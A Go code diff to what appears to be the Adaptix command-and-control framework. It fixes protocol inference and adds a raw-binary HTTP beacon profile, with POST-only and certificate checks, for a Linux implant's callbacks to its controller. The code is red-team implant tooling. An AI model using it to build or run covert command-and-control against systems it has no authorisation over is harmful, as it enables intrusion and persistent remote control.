@@ -427,9 +427,14 @@ func (p *PluginAgent) GenerateProfiles(profile adaptix.BuildProfile) ([][]byte, 
 		}
 
 		protocol, _ := listenerMap["protocol"].(string)
-		// Infer protocol from other fields when "protocol" key is not in l_data
-		// BeaconWS sets protocol="http" (from listener WS plugin) — map it to "ws"
-		if protocol == "" || protocol == "http" {
+		// Infer protocol from other fields ONLY when "protocol" key is missing.
+		// ★ 2026-11-07：不再把 protocol=="http" 卷进推断 —— BeaconHTTP 的
+		// l_data 也有 uri 键，旧逻辑会把它误判成 "ws"，静默生成一个对着
+		// HTTP 监听器发 WebSocket Upgrade 的载荷（永远上不了线还不报错）。
+		// 现在 BeaconWS 的 config.yaml 已明确写 protocol:"ws"，这段特征
+		// 推断只剩「protocol 键缺失的旧监听器数据」这一个客户；BeaconHTTP
+		// 的 "http" 原样进 switch，走下面的 "http" case（原始 body 协议）。
+		if protocol == "" {
 			if _, hasWsUri := listenerMap["uri"]; hasWsUri {
 				protocol = "ws"
 			} else if _, hasTcpBanner := listenerMap["tcp_banner"]; hasTcpBanner {
@@ -533,6 +538,32 @@ func (p *PluginAgent) GenerateProfiles(profile adaptix.BuildProfile) ([][]byte, 
 				BindPort:          int(port),
 			}
 			profileData, _ = msgpack.Marshal(profile)
+		case "http":
+			// BeaconHTTP：与 https_emu 同骨架的 POST + 心跳头 + 模板页，
+			// 但 wire 是「原始二进制」——body 不做 base64、响应模板槽里
+			// 填的也是原始密文（beacon_listener_http/pl_transport.go 的
+			// parseBeatAndData 直读 body、processRequest 用 responseData
+			// 原样替换 <<<PAYLOAD_DATA>>>）。agent 侧由 is_raw_http 标志
+			// 区分（main.c 的 https_command_loop 走 raw 分支）。
+			// 两个硬限制在生成期就报出来，不静默：
+			//  1) http_method 只支持 POST —— agent 只实现了 POST 打点；
+			//  2) 自签证书是 RSA，而 linux 的 mbedtls 是 ECDSA-only 裁剪
+			//     （开 SSL 必握手失败）——要么关 SSL，要么上传 ECDSA 证书。
+			httpMethod, _ := listenerMap["http_method"].(string)
+			if httpMethod != "" && !strings.EqualFold(httpMethod, "POST") {
+				return nil, errors.New("BeaconHTTP listener is configured with http_method=" + httpMethod + "; linux agent supports POST only")
+			}
+			if sslFromListenerMap(listenerMap) {
+				certLen := 0
+				if c, ok := listenerMap["ssl_cert"].(string); ok {
+					certLen = len(c)
+				}
+				if certLen == 0 {
+					return nil, errors.New("BeaconHTTP+SSL uses a self-signed RSA cert; the linux agent's mbedtls build is ECDSA-only and the TLS handshake can never succeed. Disable SSL or upload an ECDSA cert (or use the BeaconHTTPS listener)")
+				}
+			}
+			fallthrough
+
 		case "ws", "https":
 			isHttpsEmu := protocol == "https"
 			// callback_addresses can be string or []interface{} — handle both
@@ -588,6 +619,7 @@ func (p *PluginAgent) GenerateProfiles(profile adaptix.BuildProfile) ([][]byte, 
 				AnsSize:           0, // Will be computed from WebPageOutput template length
 				AnsPreSize:        0,
 				IsHttpsEmu:        isHttpsEmu,
+				IsRawHttp:         protocol == "http", // BeaconHTTP：原始二进制 body/响应（见 case "http" 注释）
 				HeartbeatHeader:   hbHeader,
 			}
 
